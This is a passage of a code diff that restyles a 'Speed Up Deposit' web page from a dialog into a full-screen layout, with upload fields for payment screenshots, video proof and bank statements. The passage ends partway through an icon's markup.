@@ -6,7 +6,7 @@
     <title>Speed Up Deposit</title>
     <style>
         :root {
-     --scroll: 100%;
+            --scroll: 100%;
             --layer1: #1a1a1a;
             --layer2: #121212;
             --layer3: #2a2a2a;
@@ -19,7 +19,7 @@
             --button_bright: #2a2a2a;
             --third: #404040;
             --input: #555555;
-}
+        }
 
         * {
             margin: 0;
@@ -32,32 +32,20 @@
             background-color: var(--layer2);
             color: var(--primary);
             line-height: 1.5;
-        }
-
-        .dialog-list {
-            display: flex;
-            justify-content: center;
-            align-items: center;
             min-height: 100vh;
-            padding: 20px;
         }
 
-        .dialog-overlayer {
+        .full-screen-container {
             width: 100%;
-            max-width: 500px;
+            min-height: 100vh;
+           align-items: center;
+           padding: 10px;
             background-color: var(--layer1);
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-
-        .dialog-item {
-            padding: 0;
         }
 
         .dialog-title {
             position: relative;
-            padding: 16px 20px;
+            padding: 16px 0;
             font-size: 18px;
             font-weight: 600;
             border-bottom: 1px solid var(--third);
@@ -124,8 +112,8 @@
         }
 
         .dialog-content {
-            padding: 20px;
-            max-height: 70vh;
+            padding: 20px 0;
+            max-height: calc(100vh - 100px);
             overflow-y: auto;
         }
 
@@ -515,191 +503,187 @@
     </style>
 </head>
 <body>
-    <div class="dialog-list">
-        <div class="dialog-overlayer" style="--scroll: 100%;">
-            <div class="dialog-item">
-                <div class="dialog-title">
-                    Speed Up
-                    <div class="ml-auto absolute right-4 top-0 flex items-center h-full">
-                        <button class="button button-m dialog-close ml-2 !p-0" type="button">
-                            <div class="icon size-3">
-                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M7.15445 7.40846C6.3734 8.18951 6.3734 9.45584 7.15445 10.2369L12.9175 15.9999L7.15445 21.7629C6.3734 22.544 6.3734 23.8103 7.15445 24.5914L7.40846 24.8454C8.18951 25.6264 9.45584 25.6264 10.2369 24.8454L15.9998 19.0825L21.7631 24.8458C22.5441 25.6269 23.8104 25.6269 24.5915 24.8458L24.8455 24.5918C25.6265 23.8108 25.6265 22.5444 24.8455 21.7634L19.0825 16.0003L24.8455 10.2373C25.6265 9.45627 25.6265 8.18994 24.8455 7.40889L24.5915 7.15488C23.8104 6.37383 22.5441 6.37383 21.7631 7.15488L16.0002 12.9177L10.2369 7.15445C9.45584 6.3734 8.18951 6.3734 7.40846 7.15445L7.15445 7.40846Z"></path>
-                                </svg>
+    <div class="full-screen-container">
+        <div class="dialog-title">
+            Speed Up
+            <div class="ml-auto absolute right-4 top-0 flex items-center h-full">
+                <button class="button button-m dialog-close ml-2 !p-0" type="button">
+                    <div class="icon size-3">
+                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M7.15445 7.40846C6.3734 8.18951 6.3734 9.45584 7.15445 10.2369L12.9175 15.9999L7.15445 21.7629C6.3734 22.544 6.3734 23.8103 7.15445 24.5914L7.40846 24.8454C8.18951 25.6264 9.45584 25.6264 10.2369 24.8454L15.9998 19.0825L21.7631 24.8458C22.5441 25.6269 23.8104 25.6269 24.5915 24.8458L24.8455 24.5918C25.6265 23.8108 25.6265 22.5444 24.8455 21.7634L19.0825 16.0003L24.8455 10.2373C25.6265 9.45627 25.6265 8.18994 24.8455 7.40889L24.5915 7.15488C23.8104 6.37383 22.5441 6.37383 21.7631 7.15488L16.0002 12.9177L10.2369 7.15445C9.45584 6.3734 8.18951 6.3734 7.40846 7.15445L7.15445 7.40846Z"></path>
+                        </svg>
+                    </div>
+                </button>
+            </div>
+        </div>
+        <div class="scroll-y dialog-content">
+            <div class="scroll-container">
+                <div class="p-2 flex text-secondary rounded-xl bg-success/10 mt-4">
+                    <div class="icon flex-none -mt-0.5 w-6 h-6 mr-1.5 text-success">
+                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M16.0005 4C22.6282 4 28.001 9.37279 28.001 16.0005C28.001 22.6282 22.6282 28.001 16.0005 28.001C9.37279 28.001 4 22.6282 4 16.0005C4 9.37279 9.37279 4 16.0005 4ZM15.8393 20.2572C15.4433 20.2572 15.1193 20.3832 14.8493 20.6352C14.5793 20.8873 14.4533 21.2113 14.4533 21.6073C14.4533 22.0033 14.5793 22.3273 14.8493 22.5793C15.1193 22.8313 15.4433 22.9753 15.8393 22.9753C16.2354 22.9753 16.5594 22.8493 16.8294 22.5973C17.0994 22.3453 17.2434 22.0033 17.2434 21.6073C17.2434 21.2113 17.0994 20.8873 16.8474 20.6352C16.5774 20.3832 16.2354 20.2572 15.8393 20.2572ZM15.7999 8.74019C15.7768 8.74019 15.7536 8.74105 15.7313 8.74191C14.8313 8.77962 14.1327 9.53994 14.1713 10.44L14.5013 18.2506H17.0651L17.4234 10.4391C17.4243 10.4143 17.4251 10.3894 17.4251 10.3645C17.4251 9.46708 16.6974 8.74019 15.8008 8.74019H15.7999Z"></path>
+                        </svg>
+                    </div>
+                    We strongly recommend you to upload your transfer proof to speed up your deposit process.
+                </div>
+                
+                <section class="text-base text-secondary mt-5">
+                    <div class="bod rounded-xl bg-layer4 px-4 py-2.5">
+                        <header class="justify-between text-base font-extrabold text-primary center border-b border-solid border-third pb-2.5">
+                            <span>Order Details</span>
+                            <button class="button button-m cursor-pointer bg-button_bright size-6 p-0" type="button">
+                                <div class="icon size-4 -rotate-90">
+                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                                    </svg>
+                                </div>
+                            </button>
+                        </header>
+                        <div class="overflow-hidden">
+                            <div class="mb-2 h-8 justify-between copy-item center">
+                                <div class="text-secondary copy-label leading-normal">Status:</div>
+                                <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">
+                                    <div class="mx-1 rounded-full size-2 bg-current text-warning"></div>
+                                    <span>Processing</span>
+                                </div>
                             </div>
-                        </button>
+                            <div class="mb-2 h-8 justify-between copy-item center">
+                                <div class="text-secondary copy-label leading-normal">Amount:</div>
+                                <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">****</div>
+                            </div>
+                            <div class="mb-2 h-8 justify-between copy-item center">
+                                <div class="text-secondary copy-label leading-normal">OrderId:</div>
+                                <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center bg-layer3 cursor-pointer">
+                                    ***************
+                                    <div class="icon size-4 flex-none ml-1">
+                                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M21.4741 4C24.0507 4 26.1395 6.0888 26.1395 8.66533V18.6729C26.1395 20.623 24.5577 22.2047 22.6077 22.2047L21.3085 22.2039V23.6132C21.3085 25.5641 19.7276 27.1442 17.7775 27.1442H8.86396C6.91307 27.1442 5.33301 25.5633 5.33301 23.6132V12.4713C5.33301 10.5212 6.91391 8.93947 8.86396 8.93947L10.1623 8.93862L10.1632 7.53179C10.1632 5.63892 11.6524 4.09334 13.5234 4.0042L13.6941 4H21.4741ZM21.4741 6.08376H13.6949C12.8961 6.08376 12.2461 6.73378 12.2461 7.53263V8.93947L17.9541 8.94031C19.8066 8.94031 21.3085 10.4422 21.3085 12.2955V20.1218H22.6077C23.3662 20.1218 23.991 19.5348 24.0515 18.7915L24.0566 18.6729V8.66533C24.0566 7.24168 22.8978 6.08376 21.4741 6.08376Z"></path>
+                                        </svg>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="mb-2 h-8 justify-between copy-item center">
+                                <div class="text-secondary copy-label leading-normal">Time:</div>
+                                <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">**/*/****, *:**:* PM/AM</div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                
+                <div class="mt-4">
+                    <div class="text-base font-extrabold">Please provide: <b class="text-brand ml-1">*</b></div>
+                    <div class="text-secondary">A screenshot and a video proof of the payment channel of the successful recharge: </div>
+                    <div class="text-secondary text-xs">(*Image limit 10MB, Video limit 100MB, PDF limit 50MB)</div>
+                    <div class="text-sm text-brand cursor-pointer my-2 underline">
+                        <span>What is transfer proof?</span>
                     </div>
                 </div>
-                <div class="scroll-y dialog-content">
-                    <div class="scroll-container">
-                        <div class="p-2 flex text-secondary rounded-xl bg-success/10 mt-4">
-                            <div class="icon flex-none -mt-0.5 w-6 h-6 mr-1.5 text-success">
-                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                    <path d="M16.0005 4C22.6282 4 28.001 9.37279 28.001 16.0005C28.001 22.6282 22.6282 28.001 16.0005 28.001C9.37279 28.001 4 22.6282 4 16.0005C4 9.37279 9.37279 4 16.0005 4ZM15.8393 20.2572C15.4433 20.2572 15.1193 20.3832 14.8493 20.6352C14.5793 20.8873 14.4533 21.2113 14.4533 21.6073C14.4533 22.0033 14.5793 22.3273 14.8493 22.5793C15.1193 22.8313 15.4433 22.9753 15.8393 22.9753C16.2354 22.9753 16.5594 22.8493 16.8294 22.5973C17.0994 22.3453 17.2434 22.0033 17.2434 21.6073C17.2434 21.2113 17.0994 20.8873 16.8474 20.6352C16.5774 20.3832 16.2354 20.2572 15.8393 20.2572ZM15.7999 8.74019C15.7768 8.74019 15.7536 8.74105 15.7313 8.74191C14.8313 8.77962 14.1327 9.53994 14.1713 10.44L14.5013 18.2506H17.0651L17.4234 10.4391C17.4243 10.4143 17.4251 10.3894 17.4251 10.3645C17.4251 9.46708 16.6974 8.74019 15.8008 8.74019H15.7999Z"></path>
-                                </svg>
-                            </div>
-                            We strongly recommend you to upload your transfer proof to speed up your deposit process.
+                
+                <div class="file-upload-container">
+                    <div class="file-icon">
+                        <div class="icon size-5 fill-primary">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12.4 14.0558C13.9773 14.0558 15.256 12.7771 15.256 11.1998C15.256 9.62249 13.9773 8.34381 12.4 8.34381C10.8227 8.34381 9.544 9.62249 9.544 11.1998C9.544 12.7771 10.8227 14.0558 12.4 14.0558Z"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M10.9721 3.99982H21.0281C25.3961 3.99982 28.0001 6.60382 28.0001 10.9718V21.0278C28.0001 25.3958 25.3961 27.9998 21.0281 27.9998H10.9721C7.91208 27.9998 5.70408 26.7158 4.67208 24.4358C4.22808 23.4758 4.00008 22.3358 4.00008 21.0278V10.9718C4.00008 6.60382 6.60408 3.99982 10.9721 3.99982ZM22.6601 16.5998C23.5961 15.7958 25.1081 15.7958 26.0441 16.5998L26.2001 16.7318V10.9718C26.2001 7.58782 24.4121 5.79982 21.0281 5.79982H10.9721C7.58808 5.79982 5.80008 7.58782 5.80008 10.9718V21.0278C5.80008 21.9398 5.95608 22.7198 6.22008 23.3918L10.7081 20.3798C11.6681 19.7318 13.0241 19.8038 13.8761 20.5478L14.2841 20.8838C15.2201 21.6878 16.7321 21.6878 17.6681 20.8838L22.6601 16.5998Z"></path>
+                            </svg>
                         </div>
-                        
-                        <section class="text-base text-secondary mt-5">
-                            <div class="bod rounded-xl bg-layer4 px-4 py-2.5">
-                                <header class="justify-between text-base font-extrabold text-primary center border-b border-solid border-third pb-2.5">
-                                    <span>Order Details</span>
-                                    <button class="button button-m cursor-pointer bg-button_bright size-6 p-0" type="button">
-                                        <div class="icon size-4 -rotate-90">
-                                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
-                                            </svg>
-                                        </div>
-                                    </button>
-                                </header>
-                                <div class="overflow-hidden">
-                                    <div class="mb-2 h-8 justify-between copy-item center">
-                                        <div class="text-secondary copy-label leading-normal">Status:</div>
-                                        <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">
-                                            <div class="mx-1 rounded-full size-2 bg-current text-warning"></div>
-                                            <span>Processing</span>
-                                        </div>
-                                    </div>
-                                    <div class="mb-2 h-8 justify-between copy-item center">
-                                        <div class="text-secondary copy-label leading-normal">Amount:</div>
-                                        <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">****</div>
-                                    </div>
-                                    <div class="mb-2 h-8 justify-between copy-item center">
-                                        <div class="text-secondary copy-label leading-normal">OrderId:</div>
-                                        <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center bg-layer3 cursor-pointer">
-                                            ***************
-                                            <div class="icon size-4 flex-none ml-1">
-                                                <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                                    <path d="M21.4741 4C24.0507 4 26.1395 6.0888 26.1395 8.66533V18.6729C26.1395 20.623 24.5577 22.2047 22.6077 22.2047L21.3085 22.2039V23.6132C21.3085 25.5641 19.7276 27.1442 17.7775 27.1442H8.86396C6.91307 27.1442 5.33301 25.5633 5.33301 23.6132V12.4713C5.33301 10.5212 6.91391 8.93947 8.86396 8.93947L10.1623 8.93862L10.1632 7.53179C10.1632 5.63892 11.6524 4.09334 13.5234 4.0042L13.6941 4H21.4741ZM21.4741 6.08376H13.6949C12.8961 6.08376 12.2461 6.73378 12.2461 7.53263V8.93947L17.9541 8.94031C19.8066 8.94031 21.3085 10.4422 21.3085 12.2955V20.1218H22.6077C23.3662 20.1218 23.991 19.5348 24.0515 18.7915L24.0566 18.6729V8.66533C24.0566 7.24168 22.8978 6.08376 21.4741 6.08376Z"></path>
-                                                </svg>
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="mb-2 h-8 justify-between copy-item center">
-                                        <div class="text-secondary copy-label leading-normal">Time:</div>
-                                        <div class="text-primary justify-between h-full rounded-xl px-3 copy-val notranslate center">**/*/****, *:**:* PM/AM</div>
-                                    </div>
-                                </div>
-                            </div>
-                        </section>
-                        
-                        <div class="mt-4">
-                            <div class="text-base font-extrabold">Please provide: <b class="text-brand ml-1">*</b></div>
-                            <div class="text-secondary">A screenshot and a video proof of the payment channel of the successful recharge: </div>
-                            <div class="text-secondary text-xs">(*Image limit 10MB, Video limit 100MB, PDF limit 50MB)</div>
-                            <div class="text-sm text-brand cursor-pointer my-2 underline">
-                                <span>What is transfer proof?</span>
-                            </div>
+                    </div>
+                    <div class="file-info">
+                        <div class="text-primary">Screenshot of your transfer confirmation
+                            <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
                         </div>
-                        
-                        <div class="file-upload-container">
-                            <div class="file-icon">
-                                <div class="icon size-5 fill-primary">
+                        <div class="file-name" id="screenshot-name"></div>
+                    </div>
+                    <input type="file" class="sr-only" id="screenshot-file" accept="image/*">
+                    <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="screenshot-file">
+                        Upload
+                        <div class="icon size-5 rotate-180 pointer-events-none">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                            </svg>
+                        </div>
+                    </button>
+                </div>
+                
+                <div class="file-upload-container">
+                    <div class="file-icon">
+                        <div class="icon size-5 fill-primary">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M15.5732 10.8916C16.7489 10.8916 17.7021 11.8448 17.7021 13.0205C17.7019 14.196 16.7488 15.1484 15.5732 15.1484C14.3979 15.1482 13.4455 14.1958 13.4453 13.0205C13.4453 11.845 14.3978 10.8918 15.5732 10.8916Z"></path>
+                                <path fill-rule="evenodd" clip-rule="evenodd" d="M16.6016 5.33398C18.4557 5.33403 20.0442 5.62816 21.1191 6.70312C22.0121 7.5963 22.3639 8.84381 22.458 10.3037L23.9033 9.29102C24.8389 8.63761 26.0027 8.30029 27.0361 8.83984C28.0695 9.37948 28.46 10.5284 28.46 11.6748V20.3262C28.4599 21.4715 28.07 22.6221 27.0342 23.1602C25.9983 23.6983 24.8342 23.3548 23.9004 22.6963L23.8984 22.6943L22.459 21.6846C22.3653 23.1513 22.0113 24.4035 21.1143 25.2988C20.0384 26.3726 18.4511 26.6669 16.6016 26.667H9.42578C7.36723 26.667 5.83506 25.9698 4.84082 24.7773C3.87625 23.6202 3.53911 22.1414 3.53906 20.7803V11.2207C3.53906 9.36646 3.83325 7.77817 4.9082 6.70312C5.98322 5.62811 7.57153 5.334 9.42578 5.33398H16.6016ZM9.42578 7.54785C7.6926 7.54787 6.89152 7.85067 6.47363 8.26855C6.0558 8.68648 5.75293 9.48758 5.75293 11.2207V20.7803C5.75298 21.8144 6.01275 22.7257 6.54102 23.3594C7.03969 23.9576 7.89715 24.4531 9.42578 24.4531H16.6016C18.3278 24.4531 19.13 24.1505 19.5498 23.7314C19.9691 23.3129 20.2734 22.5112 20.2734 20.7803V11.2207C20.2734 9.48777 19.9715 8.68652 19.5537 8.26855C19.1358 7.85069 18.3346 7.5479 16.6016 7.54785H9.42578ZM25.8232 10.7969C25.6816 10.8224 25.4605 10.904 25.1719 11.1055L25.1709 11.1064L22.4873 12.9883V19.001L25.1729 20.8838L25.1758 20.8857C25.4656 21.0903 25.6875 21.1732 25.8291 21.1992C25.9602 21.2233 26.0083 21.1981 26.0137 21.1953C26.0207 21.1917 26.0687 21.165 26.124 21.0449C26.1847 20.913 26.2461 20.6827 26.2461 20.3262V11.6748C26.2461 11.3182 26.1849 11.0874 26.124 10.9551C26.0677 10.8328 26.0188 10.8064 26.0117 10.8027C26.0054 10.7994 25.9557 10.7731 25.8232 10.7969Z"></path>
+                            </svg>
+                        </div>
+                    </div>
+                    <div class="file-info">
+                        <div class="text-primary">
+                            <div>Video proof (not screen recording)
+                                <div class="icon inline-block size-4 ml-1">
                                     <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M12.4 14.0558C13.9773 14.0558 15.256 12.7771 15.256 11.1998C15.256 9.62249 13.9773 8.34381 12.4 8.34381C10.8227 8.34381 9.544 9.62249 9.544 11.1998C9.544 12.7771 10.8227 14.0558 12.4 14.0558Z"></path>
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M10.9721 3.99982H21.0281C25.3961 3.99982 28.0001 6.60382 28.0001 10.9718V21.0278C28.0001 25.3958 25.3961 27.9998 21.0281 27.9998H10.9721C7.91208 27.9998 5.70408 26.7158 4.67208 24.4358C4.22808 23.4758 4.00008 22.3358 4.00008 21.0278V10.9718C4.00008 6.60382 6.60408 3.99982 10.9721 3.99982ZM22.6601 16.5998C23.5961 15.7958 25.1081 15.7958 26.0441 16.5998L26.2001 16.7318V10.9718C26.2001 7.58782 24.4121 5.79982 21.0281 5.79982H10.9721C7.58808 5.79982 5.80008 7.58782 5.80008 10.9718V21.0278C5.80008 21.9398 5.95608 22.7198 6.22008 23.3918L10.7081 20.3798C11.6681 19.7318 13.0241 19.8038 13.8761 20.5478L14.2841 20.8838C15.2201 21.6878 16.7321 21.6878 17.6681 20.8838L22.6601 16.5998Z"></path>
+                                        <path d="M16.0001 4C22.6276 4 28.0003 9.37263 28.0003 16.0001C28.0003 22.6276 22.6276 28.0003 16.0001 28.0003C9.37263 28.0003 4 22.6276 4 16.0001C4 9.37263 9.37263 4 16.0001 4ZM16.0001 6.57146C10.7929 6.57146 6.57146 10.7929 6.57146 16.0001C6.57146 21.2073 10.7929 25.4288 16.0001 25.4288C21.2073 25.4288 25.4288 21.2073 25.4288 16.0001C25.4288 10.7929 21.2073 6.57146 16.0001 6.57146ZM15.9607 21.0711C16.6704 21.0711 17.2464 21.6471 17.2464 22.3568C17.2464 23.0665 16.6704 23.6425 15.9607 23.6425C15.251 23.6425 14.675 23.0665 14.675 22.3568C14.675 21.6471 15.251 21.0711 15.9607 21.0711ZM16.187 8.99463C17.5242 8.99463 18.6145 9.34435 19.4373 10.0849C20.2602 10.8049 20.6716 11.7924 20.6716 13.0472C20.6716 14.0758 20.4042 14.9193 19.9105 15.5776C19.7253 15.7833 19.1287 16.3387 18.1413 17.2027C17.771 17.5113 17.5036 17.861 17.3184 18.2313C17.1419 18.5836 17.0416 18.9513 17.0159 19.3602L17.0099 19.5685V19.8565H14.6441V19.5685C14.6441 18.7867 14.7676 18.1079 15.0556 17.5524C15.3084 17.0279 16.0379 16.2281 17.2447 15.1353L17.4624 14.9398L17.7093 14.6518C18.0796 14.1993 18.2647 13.7055 18.2647 13.1912C18.2647 12.5124 18.059 11.9775 17.6887 11.5867C17.2979 11.1958 16.7424 11.0107 16.043 11.0107C15.1378 11.0107 14.5001 11.2781 14.1093 11.8541C13.7913 12.2844 13.6267 12.8844 13.5993 13.6387L13.595 13.8701H11.2498C11.2498 12.3478 11.6818 11.1547 12.587 10.2906C13.4715 9.42663 14.6647 8.99463 16.187 8.99463Z"></path>
                                     </svg>
                                 </div>
                             </div>
-                            <div class="file-info">
-                                <div class="text-primary">Screenshot of your transfer confirmation
-                                    <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
-                                </div>
-                                <div class="file-name" id="screenshot-name"></div>
-                            </div>
-                            <input type="file" class="sr-only" id="screenshot-file" accept="image/*">
-                            <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="screenshot-file">
-                                Upload
-                                <div class="icon size-5 rotate-180 pointer-events-none">
-                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
-                                    </svg>
-                                </div>
-                            </button>
+                            <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
                         </div>
-                        
-                        <div class="file-upload-container">
-                            <div class="file-icon">
-                                <div class="icon size-5 fill-primary">
-                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M15.5732 10.8916C16.7489 10.8916 17.7021 11.8448 17.7021 13.0205C17.7019 14.196 16.7488 15.1484 15.5732 15.1484C14.3979 15.1482 13.4455 14.1958 13.4453 13.0205C13.4453 11.845 14.3978 10.8918 15.5732 10.8916Z"></path>
-                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M16.6016 5.33398C18.4557 5.33403 20.0442 5.62816 21.1191 6.70312C22.0121 7.5963 22.3639 8.84381 22.458 10.3037L23.9033 9.29102C24.8389 8.63761 26.0027 8.30029 27.0361 8.83984C28.0695 9.37948 28.46 10.5284 28.46 11.6748V20.3262C28.4599 21.4715 28.07 22.6221 27.0342 23.1602C25.9983 23.6983 24.8342 23.3548 23.9004 22.6963L23.8984 22.6943L22.459 21.6846C22.3653 23.1513 22.0113 24.4035 21.1143 25.2988C20.0384 26.3726 18.4511 26.6669 16.6016 26.667H9.42578C7.36723 26.667 5.83506 25.9698 4.84082 24.7773C3.87625 23.6202 3.53911 22.1414 3.53906 20.7803V11.2207C3.53906 9.36646 3.83325 7.77817 4.9082 6.70312C5.98322 5.62811 7.57153 5.334 9.42578 5.33398H16.6016ZM9.42578 7.54785C7.6926 7.54787 6.89152 7.85067 6.47363 8.26855C6.0558 8.68648 5.75293 9.48758 5.75293 11.2207V20.7803C5.75298 21.8144 6.01275 22.7257 6.54102 23.3594C7.03969 23.9576 7.89715 24.4531 9.42578 24.4531H16.6016C18.3278 24.4531 19.13 24.1505 19.5498 23.7314C19.9691 23.3129 20.2734 22.5112 20.2734 20.7803V11.2207C20.2734 9.48777 19.9715 8.68652 19.5537 8.26855C19.1358 7.85069 18.3346 7.5479 16.6016 7.54785H9.42578ZM25.8232 10.7969C25.6816 10.8224 25.4605 10.904 25.1719 11.1055L25.1709 11.1064L22.4873 12.9883V19.001L25.1729 20.8838L25.1758 20.8857C25.4656 21.0903 25.6875 21.1732 25.8291 21.1992C25.9602 21.2233 26.0083 21.1981 26.0137 21.1953C26.0207 21.1917 26.0687 21.165 26.124 21.0449C26.1847 20.913 26.2461 20.6827 26.2461 20.3262V11.6748C26.2461 11.3182 26.1849 11.0874 26.124 10.9551C26.0677 10.8328 26.0188 10.8064 26.0117 10.8027C26.0054 10.7994 25.9557 10.7731 25.8232 10.7969Z"></path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="file-info">
-                                <div class="text-primary">
-                                    <div>Video proof (not screen recording)
-                                        <div class="icon inline-block size-4 ml-1">
-                                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                                <path d="M16.0001 4C22.6276 4 28.0003 9.37263 28.0003 16.0001C28.0003 22.6276 22.6276 28.0003 16.0001 28.0003C9.37263 28.0003 4 22.6276 4 16.0001C4 9.37263 9.37263 4 16.0001 4ZM16.0001 6.57146C10.7929 6.57146 6.57146 10.7929 6.57146 16.0001C6.57146 21.2073 10.7929 25.4288 16.0001 25.4288C21.2073 25.4288 25.4288 21.2073 25.4288 16.0001C25.4288 10.7929 21.2073 6.57146 16.0001 6.57146ZM15.9607 21.0711C16.6704 21.0711 17.2464 21.6471 17.2464 22.3568C17.2464 23.0665 16.6704 23.6425 15.9607 23.6425C15.251 23.6425 14.675 23.0665 14.675 22.3568C14.675 21.6471 15.251 21.0711 15.9607 21.0711ZM16.187 8.99463C17.5242 8.99463 18.6145 9.34435 19.4373 10.0849C20.2602 10.8049 20.6716 11.7924 20.6716 13.0472C20.6716 14.0758 20.4042 14.9193 19.9105 15.5776C19.7253 15.7833 19.1287 16.3387 18.1413 17.2027C17.771 17.5113 17.5036 17.861 17.3184 18.2313C17.1419 18.5836 17.0416 18.9513 17.0159 19.3602L17.0099 19.5685V19.8565H14.6441V19.5685C14.6441 18.7867 14.7676 18.1079 15.0556 17.5524C15.3084 17.0279 16.0379 16.2281 17.2447 15.1353L17.4624 14.9398L17.7093 14.6518C18.0796 14.1993 18.2647 13.7055 18.2647 13.1912C18.2647 12.5124 18.059 11.9775 17.6887 11.5867C17.2979 11.1958 16.7424 11.0107 16.043 11.0107C15.1378 11.0107 14.5001 11.2781 14.1093 11.8541C13.7913 12.2844 13.6267 12.8844 13.5993 13.6387L13.595 13.8701H11.2498C11.2498 12.3478 11.6818 11.1547 12.587 10.2906C13.4715 9.42663 14.6647 8.99463 16.187 8.99463Z"></path>
-                                            </svg>
-                                        </div>
-                                    </div>
-                                    <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
-                                </div>
-                                <div class="file-name" id="video-name"></div>
-                            </div>
-                            <input type="file" class="sr-only" id="video-file" accept="video/*,video/3gpp">
-                            <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="video-file">
-                                Upload
-                                <div class="icon size-5 rotate-180 pointer-events-none">
-                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
-                                    </svg>
-                                </div>
-                            </button>
+                        <div class="file-name" id="video-name"></div>
+                    </div>
+                    <input type="file" class="sr-only" id="video-file" accept="video/*,video/3gpp">
+                    <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="video-file">
+                        Upload
+                        <div class="icon size-5 rotate-180 pointer-events-none">
+                            <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
+                            </svg>
                         </div>
-                        
-                        <div class="file-upload-container">
-                            <div class="file-icon">
-                                <div class="icon size-5 fill-primary">
-                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
-                                        <path d="M17.8029 4.84082L17.8037 7.51897C17.8037 10.4131 20.1216 12.7708 23.0197 12.8721L23.2142 12.8753L25.9194 12.8745V22.1993C25.9194 24.9381 23.6988 27.1587 20.9601 27.1587H11.0414C8.30266 27.1587 6.08203 24.9381 6.08203 22.1993V9.80017C6.08203 7.06065 8.30266 4.84082 11.0414 4.84082H17.8037H17.8029ZM21.4288 19.6854L10.8604 19.691C10.2921 19.7484 9.84817 20.2234 9.84817 20.8013C9.84817 21.4174 10.3527 21.9172 10.9752 21.9172L21.5435 21.9116C22.1118 21.8542 22.5558 21.3792 22.5558 20.8013C22.5558 20.1852 22.0513 19.6854 21.4288 19.6854ZM21.4288 14.3291L10.8604 14.3347C10.2921 14.3921 9.84817 14.8671 9.84817 15.445C9.84817 16.0611 10.3527 16.5609 10.9752 16.5609L21.5435 16.5553C22.1118 16.4979 22.5558 16.0229 22.5558 15.445C22.5558 14.8289 22.0513 14.3291 21.4288 14.3291ZM20.9593 4.84082C23.698 4.84082 25.9186 7.06145 25.9186 9.80017V10.6427L23.2134 10.6435L23.0404 10.6387C21.4335 10.5526 20.1463 9.2765 20.0618 7.68475L20.057 7.51897V4.84082H20.9585H20.9593Z"></path>
-                                    </svg>
-                                </div>
-                            </div>
-                            <div class="file-info">
-                                <div class="text-primary">Bank statement or transaction record from the past 30 days
-                                    <button class="button button-m text-brand p-0 size-auto underline" type="button">Example</button>
-                                </div>
-                                <div class="file-name" id="statement-name"></div>
-                            </div>
-                            <input type="file" class="sr-only" id="statement-file" accept="application/pdf">
-                            <button class="button button-m ml-auto flex-none text-brand flex items-center relative cursor-pointer file-upload-btn" type="button" data-target="statement-file">
-                                Upload
-                                <div class="icon size-5 rotate-180 pointer-events-none">
-                                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
